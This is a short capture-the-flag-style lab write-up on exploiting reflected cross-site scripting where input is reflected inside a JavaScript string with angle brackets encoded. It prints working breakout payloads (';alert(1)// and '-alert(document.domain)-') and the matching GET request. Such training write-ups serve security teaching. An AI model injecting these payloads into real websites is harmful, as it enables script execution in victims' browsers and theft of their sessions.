### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.  

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

_____

Analysis and Exploit:

1. Test string to determine XSS context
```html
<script>
    var searchTerms = 'TESTSEARCH';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

2. Inject payload without breaking the syntax otherwise the entire code would not execute

Payload 1 - Close declaration and comment out the rest of the line ```';alert(1)//```

```html
<script>
    var searchTerms = '';alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Payload 2 - Embed function in string without breaking syntax

```html
<script>
    var searchTerms = ''-alert(document.domain)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

_____

Script notes:

2. GET /?search=[';alert(1)//, URL ENCODED]